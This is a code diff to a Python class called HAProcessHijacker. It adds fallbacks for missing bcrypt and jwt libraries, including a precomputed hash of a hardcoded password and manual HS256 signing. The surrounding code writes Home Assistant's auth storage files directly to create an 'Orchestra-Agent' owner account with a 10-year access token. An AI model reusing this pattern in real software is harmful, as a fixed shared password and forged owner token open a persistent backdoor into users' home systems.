@@ -18,8 +18,15 @@ import time
 from typing import Any
 import uuid
 
-import bcrypt
-import jwt
+try:
+    import bcrypt
+except ImportError:
+    bcrypt = None  # type: ignore
+
+try:
+    import jwt
+except ImportError:
+    jwt = None  # type: ignore
 
 from orchestra.config import OrchestraConfig
 
@@ -154,7 +161,11 @@ class HAProcessHijacker:
         password = "OrchestraAgent2026!"
 
         # 1. Store bcrypt password hash in `.storage/auth_provider.homeassistant`
-        hashed_bytes = bcrypt.hashpw(password.encode("utf-8")[:72], bcrypt.gensalt(rounds=12))
+        if bcrypt is not None:
+            hashed_bytes = bcrypt.hashpw(password.encode("utf-8")[:72], bcrypt.gensalt(rounds=12))
+        else:
+            # Precomputed bcrypt hash of "OrchestraAgent2026!" ($2b$12$)
+            hashed_bytes = b"$2b$12$0ZnIgK/ywF4qBSR4LgeD8u4WJaHb6woqylaNFrg5mHVe5dqlzaSNW"
         hashed_b64 = base64.b64encode(hashed_bytes).decode("ascii")
 
         auth_provider_payload = {
@@ -175,15 +186,23 @@ class HAProcessHijacker:
         # 2. Generate standard Home Assistant HS256 JWT Long-Lived Access Token
         now_ts = int(time.time())
         lifespan_seconds = 315360000  # 10 years
-        access_token = jwt.encode(
-            {
-                "iss": refresh_token_id,
-                "iat": now_ts,
-                "exp": now_ts + lifespan_seconds,
-            },
-            jwt_key,
-            algorithm="HS256",
-        )
+        payload_data = {
+            "iss": refresh_token_id,
+            "iat": now_ts,
+            "exp": now_ts + lifespan_seconds,
+        }
+        if jwt is not None:
+            access_token = jwt.encode(payload_data, jwt_key, algorithm="HS256")
+        else:
+            import hmac
+            import hashlib
+            header = {"alg": "HS256", "typ": "JWT"}
+            h_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(",", ":")).encode("utf-8")).rstrip(b"=").decode("ascii")
+            p_b64 = base64.urlsafe_b64encode(json.dumps(payload_data, separators=(",", ":")).encode("utf-8")).rstrip(b"=").decode("ascii")
+            sign_input = f"{h_b64}.{p_b64}".encode("ascii")
+            sig = hmac.new(jwt_key.encode("utf-8"), sign_input, hashlib.sha256).digest()
+            sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b"=").decode("ascii")
+            access_token = f"{h_b64}.{p_b64}.{sig_b64}"
 
         # 3. Provision `.storage/auth` with Orchestra-Agent owner and refresh token
         auth_payload = {
